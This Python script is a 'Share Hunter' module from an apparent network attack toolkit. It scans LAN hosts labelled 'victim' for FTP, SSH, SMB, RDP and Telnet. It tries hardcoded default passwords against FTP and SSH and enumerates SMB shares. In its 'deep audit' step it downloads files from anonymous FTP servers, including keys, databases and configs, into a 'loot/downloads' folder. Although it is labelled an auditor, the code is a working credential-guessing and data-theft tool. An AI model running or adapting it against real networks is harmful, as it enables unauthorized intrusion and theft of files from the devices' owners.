import os, sys, socket, subprocess, concurrent.futures, json
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

os.environ["PYTHONIOENCODING"] = "utf-8"
os.environ["PYTHONUTF8"] = "1"
if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
    try: sys.stdout.reconfigure(encoding="utf-8")
    except Exception: pass

console = Console(force_terminal=True, color_system="truecolor", emoji=False)

try:
    mon_dir = os.path.dirname(os.path.abspath(__file__))
    if os.path.basename(mon_dir) != "monitoring":
        mon_dir = os.path.join(os.path.dirname(mon_dir), "monitoring")
    sys.path.insert(0, mon_dir)
    from reporter import report_event, report_finding
except Exception:
    def report_event(*a, **k): pass
    def report_finding(*a, **k): pass

SERVICES = {
    21:   "FTP",
    22:   "SSH",
    445:  "SMB (Windows Share / NAS)",
    3389: "RDP (Remote Desktop)",
    23:   "Telnet",
    2049: "NFS",
    139:  "NetBIOS",
}

def get_local_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("10.255.255.255", 1))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()

def _is_ipv6(ip):
    return ":" in str(ip)

def _sockaddr(ip, port):
    ip = str(ip)
    if "%" in ip:
        host, scope = ip.split("%", 1)
        try:
            return (host, int(port), 0, int(scope))
        except Exception:
            return (host, int(port), 0, 0)
    return (ip, int(port), 0, 0) if _is_ipv6(ip) else (ip, int(port))

def _ensure_scope(ip):
    ip = str(ip).strip()
    if not _is_ipv6(ip) or "%" in ip:
        return ip
    try:
        import ipaddress
        if not ipaddress.ip_address(ip).is_link_local:
            return ip
    except Exception:
        return ip
    try:
        cmd = (f"Get-NetNeighbor -AddressFamily IPv6 -ErrorAction SilentlyContinue | "
               f"Where-Object {{ $_.IPAddress -eq '{ip}' -and $_.InterfaceIndex -gt 0 }} | "
               f"Select-Object -First 1 -ExpandProperty InterfaceIndex")
        out = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command", cmd],
            text=True, errors="ignore", timeout=3,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        ).strip()
        if out.isdigit() and int(out) > 0:
            return f"{ip}%{int(out)}"
    except Exception:
        pass
    return ip

# ─────────────────────────────────────────────────────────────────────
# TOPOLOGY LOADER
# ─────────────────────────────────────────────────────────────────────
def load_topology_targets():
    """Load PC/mobile targets from net_scan topology, exclude gateway and local"""
    try:
        mon_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "monitoring")
        topo_path = os.path.join(mon_dir, "topology.json")
        if not os.path.exists(topo_path):
            return []
        with open(topo_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        targets = []
        for node in data.get("nodes", []):
            if node.get("group") != "victim":
                continue
            ip = _ensure_scope(node.get("ip", ""))
            if not ip or ip == LOCAL_IP:
                continue
            vendor_lower = (node.get("vendor") or "").lower()
            # Skip cameras and IoT — share hunter is for PCs/NAS
            if any(k in vendor_lower for k in ("camera", "dahua", "hikvision", "ezviz", "reolink", "imou", "uniview")):
                continue
            targets.append({
                "ip": ip,
                "hostname": node.get("hostname") or node.get("vendor") or f"Host-{ip.split('.')[-1]}",
                "mac": node.get("mac", ""),
                "vendor": node.get("vendor", ""),
                "ports": node.get("ports", ""),
            })
        return targets
    except Exception:
        return []

def get_lan_hosts_fallback():
    """ARP scan fallback if no topology exists"""
    try:
        from scapy.all import ARP, Ether, srp, conf
        local_ip = conf.route.route("0.0.0.0")[1]
        subnet = local_ip.rsplit(".", 1)[0] + ".0/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=2, verbose=False)
        return [{"ip": rcv.psrc, "hostname": rcv.psrc, "mac": rcv.hwsrc, "vendor": "", "ports": ""} for _, rcv in ans if rcv.psrc != local_ip]
    except Exception:
        return []

# ─────────────────────────────────────────────────────────────────────
# PORT / SERVICE CHECKS
# ─────────────────────────────────────────────────────────────────────
def check_port(ip, port, timeout=1.5):
    try:
        family = socket.AF_INET6 if _is_ipv6(ip) else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(timeout)
        res = s.connect_ex(_sockaddr(ip, port))
        s.close()
        return res == 0
    except Exception:
        return False

def check_ftp_anonymous(ip):
    try:
        import ftplib
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout=2.0)
        ftp.login("anonymous", "anonymous@probe")
        listing = ftp.nlst()
        ftp.quit()
        return True, f"Anonymous access allowed — {len(listing)} item(s) visible"
    except Exception as e:
        return False, f"Authentication required ({e})"

def check_ftp_weak_creds(ip):
    import ftplib
    creds = [("admin","admin"),("admin","123456"),("root","root"),("admin","password"),("user","user"),("ftp","ftp")]
    for u, p in creds:
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, 21, timeout=1.5)
            ftp.login(u, p)
            ftp.quit()
            return True, f"Weak credential found: {u}:{p}"
        except Exception:
            pass
    return False, "No weak credentials matched"

def check_smb_negotiate(ip):
    """Send SMB2 Negotiate — detect if SMB service is active and responding"""
    try:
        family = socket.AF_INET6 if _is_ipv6(ip) else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(2.0)
        if s.connect_ex(_sockaddr(ip, 445)) != 0:
            s.close()
            return False, "Port 445 not reachable"
        # SMB2 Negotiate Request
        smb2_neg = (
            b"\x00\x00\x00\x44"
            b"\xfe\x53\x4d\x42"
            b"\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x24\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x02\x10\x02\x22\x02\x24\x02"
        )
        s.sendall(smb2_neg)
        resp = s.recv(1024)
        s.close()
        if len(resp) > 4 and (resp[4:8] == b"\xfeSMB" or resp[4:8] == b"\xffSMB"):
            # Try net view for share enumeration
            shares = ""
            try:
                if not _is_ipv6(ip):
                    rv = subprocess.run(f"net view \\\\{ip}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=4)
                    if rv.returncode == 0:
                        shares = rv.stdout.strip()
            except Exception:
                pass
            if shares:
                return True, f"SMBv2 active — shares enumerated:\n{shares}"
            return True, "SMBv2/v3 service responding (no anonymous share access)"
        return False, "Port 445 open but no valid SMB response"
    except Exception as e:
        return False, f"SMB probe error: {e}"

def check_rdp(ip):
    """Check if RDP is accepting connections"""
    open_ = check_port(ip, 3389, timeout=1.5)
    if open_:
        return True, "RDP service open (port 3389) — requires valid credentials"
    return False, "RDP not accessible"

def check_ssh_banner(ip):
    """Grab SSH banner and optionally test weak creds"""
    banner = ""
    try:
        family = socket.AF_INET6 if _is_ipv6(ip) else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect(_sockaddr(ip, 22))
        b = s.recv(256)
        banner = b.decode("ascii", errors="ignore").strip()
        s.close()
    except Exception:
        pass
    if not banner:
        return False, "No SSH banner received"
    # Try weak creds with paramiko if available
    try:
        import paramiko
        weak_creds = [("root","root"),("admin","admin"),("admin","123456"),("pi","raspberry")]
        for u, p in weak_creds:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=22, username=u, password=p, timeout=2.0, banner_timeout=2.0, auth_timeout=2.0)
                ssh.close()
                return True, f"[bold red]Weak SSH credential: {u}:{p}[/bold red] | Banner: {banner[:40]}"
            except paramiko.AuthenticationException:
                pass
            except Exception:
                break
        return True, f"SSH active — authentication required | Banner: {banner[:60]}"
    except ImportError:
        return True, f"SSH active | Banner: {banner[:60]}"

# ─────────────────────────────────────────────────────────────────────
# SCAN ONE HOST
# ─────────────────────────────────────────────────────────────────────
def scan_host(target):
    ip = target["ip"]
    findings = []  # list of (port, service_name, status, detail, severity)

    for port, svc_name in SERVICES.items():
        if not check_port(ip, port):
            continue

        severity = "info"
        detail = ""

        if port == 21:
            anon_ok, anon_msg = check_ftp_anonymous(ip)
            if anon_ok:
                severity = "critical"
                detail = anon_msg
            else:
                weak_ok, weak_msg = check_ftp_weak_creds(ip)
                severity = "high" if weak_ok else "info"
                detail = weak_msg
        elif port == 445:
            smb_ok, smb_msg = check_smb_negotiate(ip)
            severity = "high" if smb_ok else "info"
            detail = smb_msg
        elif port == 22:
            ssh_ok, ssh_msg = check_ssh_banner(ip)
            severity = "high" if ssh_ok else "info"
            detail = ssh_msg
        elif port == 3389:
            rdp_ok, rdp_msg = check_rdp(ip)
            severity = "medium" if rdp_ok else "info"
            detail = rdp_msg
        elif port == 23:
            severity = "critical"
            detail = "Telnet is unencrypted — all traffic transmitted in plaintext"
        else:
            detail = f"{svc_name} port is open"

        findings.append((port, svc_name, detail, severity))

        # Report to dashboard
        sev_map = {"critical": "block", "high": "block", "medium": "warn", "info": "info"}
        report_event(f"[{svc_name}] {detail[:60]}", event_type=sev_map.get(severity, "info"), module="Share Hunter", target=ip)
        if severity in ("critical", "high"):
            report_finding("Share Hunter", f"Exposed: {svc_name} (Port {port})", target=ip, severity=sev_map[severity], details=detail)

    return ip, findings

# ─────────────────────────────────────────────────────────────────────
# DEEP AUDIT — Download loot, test creds
# ─────────────────────────────────────────────────────────────────────
def deep_audit(ip, port, svc_name, detail):
    results = []
    if port == 21:
        anon_ok, _ = check_ftp_anonymous(ip)
        if anon_ok:
            try:
                import ftplib
                loot_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "loot", "downloads")
                os.makedirs(loot_dir, exist_ok=True)
                ftp = ftplib.FTP()
                ftp.connect(ip, 21, timeout=2)
                ftp.login("anonymous", "anonymous@probe")
                files = ftp.nlst()
                safe_exts = (".txt",".pdf",".docx",".xlsx",".zip",".conf",".json",".csv",".db",".key",".png",".jpg")
                downloaded = []
                for fname in files[:15]:
                    safe = os.path.basename(fname)
                    if any(safe.lower().endswith(e) for e in safe_exts):
                        safe_ip = ip.replace(":", "_").replace("%", "_")
                        lp = os.path.join(loot_dir, f"{safe_ip}_ftp_{safe}")
                        with open(lp, "wb") as lf:
                            ftp.retrbinary(f"RETR {fname}", lf.write)
                        downloaded.append(safe)
                ftp.quit()
                if downloaded:
                    results.append(f"[bold red]Downloaded {len(downloaded)} file(s) to loot/downloads: {', '.join(downloaded)}[/bold red]")
            except Exception as e:
                results.append(f"FTP file retrieval: {e}")
    elif port == 445:
        smb_ok, smb_msg = check_smb_negotiate(ip)
        results.append(smb_msg)
    elif port == 22:
        results.append("SSH brute-force — install paramiko for credential testing")
    else:
        results.append(f"{svc_name} — service confirmed open, manual testing required")
    return results

# ─────────────────────────────────────────────────────────────────────
# DISPLAY HELPERS
# ─────────────────────────────────────────────────────────────────────
SEV_COLOR = {"critical": "bold red", "high": "red", "medium": "yellow", "info": "green"}
SEV_LABEL = {"critical": "CRITICAL", "high": "HIGH", "medium": "MEDIUM", "info": "INFO"}

# ─────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────
def main():
    console.print(Panel.fit(
        "[bold magenta]PUBLIC SHARE & SERVICE AUDITOR[/bold magenta]\n"
        "[white]Scans PC, NAS, and mobile targets for exposed network services (SMB, FTP, SSH, RDP).[/white]",
        border_style="magenta"
    ))

    # Load target list
    with console.status("[cyan]Loading device list from last scan...[/cyan]", spinner="dots"):
        targets = load_topology_targets()

    if not targets:
        console.print("[yellow][!] No device list found — attempting fallback ARP scan...[/yellow]")
        targets = get_lan_hosts_fallback()

    if not targets and len(sys.argv) <= 1:
        console.print("[red][-] No targets available. Run LAN Scanner first.[/red]")
        sys.exit(0)

    # Chế độ non-interactive cho dashboard: share_hunter.py <IP|ALL> [deep]
    cli_args = sys.argv[1:]
    cli_target = cli_args[0].strip() if cli_args else ""
    cli_deep = any(a.lower() in ("deep", "--deep", "1") for a in cli_args[1:])

    if cli_target:
        if cli_target.upper() == "ALL":
            selected = targets
            console.print(f"[green][*] Auditing all {len(selected)} device(s)[/green]\n")
        else:
            selected = [{"ip": cli_target, "hostname": cli_target, "mac": "", "vendor": "", "ports": ""}]
            console.print(f"[green][*] Target: {cli_target}[/green]\n")
    else:
        # Device selection UI
        console.print(f"\n[bold cyan]Devices available for audit ({len(targets)} total):[/bold cyan]")
        for i, t in enumerate(targets, 1):
            port_hint = f" | ports: {t['ports']}" if t["ports"] and t["ports"] != "None" else ""
            console.print(f"  [[bold yellow]{i}[/bold yellow]] [cyan]{t['ip']}[/cyan] — {t['hostname']} ({t['mac']}){port_hint}")

        console.print("\n[dim]Leave blank or press Enter to audit ALL devices[/dim]")
        choice = console.input("[bold cyan]Select target (number / IP, or Enter for ALL): [/bold cyan]").strip()

        if not choice:
            selected = targets
            console.print(f"[green][*] Auditing all {len(selected)} device(s)[/green]\n")
        elif choice.isdigit() and 1 <= int(choice) <= len(targets):
            selected = [targets[int(choice) - 1]]
            console.print(f"[green][*] Target: {selected[0]['ip']} — {selected[0]['hostname']}[/green]\n")
        else:
            selected = [{"ip": choice, "hostname": choice, "mac": "", "vendor": "", "ports": ""}]
            console.print(f"[green][*] Target: {choice}[/green]\n")

    # Scan phase
    host_ips = [t["ip"] for t in selected]
    all_findings = {}  # ip -> [(port, svc, detail, severity)]

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as prog:
        task = prog.add_task("[cyan]Probing services...[/cyan]", total=len(selected))
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
            fut_map = {ex.submit(scan_host, t): t for t in selected}
            for fut in concurrent.futures.as_completed(fut_map):
                ip, findings = fut.result()
                all_findings[ip] = findings
                prog.advance(task)

    # Results table
    tbl = Table(
        title="[bold green]SERVICE AUDIT RESULTS[/bold green]",
        border_style="green", show_lines=True
    )
    tbl.add_column("IP Address", style="cyan", no_wrap=True)
    tbl.add_column("Port", style="magenta", justify="right")
    tbl.add_column("Service", style="bold yellow")
    tbl.add_column("Severity", no_wrap=True)
    tbl.add_column("Details", style="white", overflow="fold")

    has_findings = False
    for ip in host_ips:
        findings = all_findings.get(ip, [])
        if not findings:
            tbl.add_row(ip, "—", "No exposed services found", "[green]CLEAN[/green]", "")
        else:
            has_findings = True
            for port, svc, detail, sev in findings:
                sev_display = f"[{SEV_COLOR.get(sev,'white')}]{SEV_LABEL.get(sev,sev.upper())}[/{SEV_COLOR.get(sev,'white')}]"
                tbl.add_row(ip, str(port), svc, sev_display, detail)

    console.print()
    console.print(tbl)

    if not has_findings:
        console.print("\n[green][*] No exposed services detected on selected targets.[/green]")
        return

    # Deep audit option
    if cli_deep:
        opt = "1"
    else:
        console.print("\n[bold cyan]Deep audit options:[/bold cyan]")
        console.print("  [1] Run deep audit — attempt file retrieval and credential testing")
        console.print("  [2] Exit\n")
        try:
            opt = console.input("[bold yellow]Select (1/2, default 2): [/bold yellow]").strip()
        except Exception:
            opt = "2"

    if opt != "1":
        console.print("\n[dim]Audit complete.[/dim]")
        return

    console.print("\n[bold green]=== DEEP AUDIT ===[/bold green]\n")
    for ip in host_ips:
        findings = all_findings.get(ip, [])
        if not findings:
            continue
        console.print(f"[bold cyan]Target: {ip}[/bold cyan]")
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            futs = {ex.submit(deep_audit, ip, port, svc, detail): (port, svc) for port, svc, detail, sev in findings}
            for fut in concurrent.futures.as_completed(futs):
                port, svc = futs[fut]
                results = fut.result()
                console.print(f"  [bold yellow]Port {port} ({svc}):[/bold yellow]")
                for r in results:
                    console.print(f"    -> {r}")
        console.print()

    console.print("[dim]Deep audit complete.[/dim]")

if __name__ == "__main__":
    main()
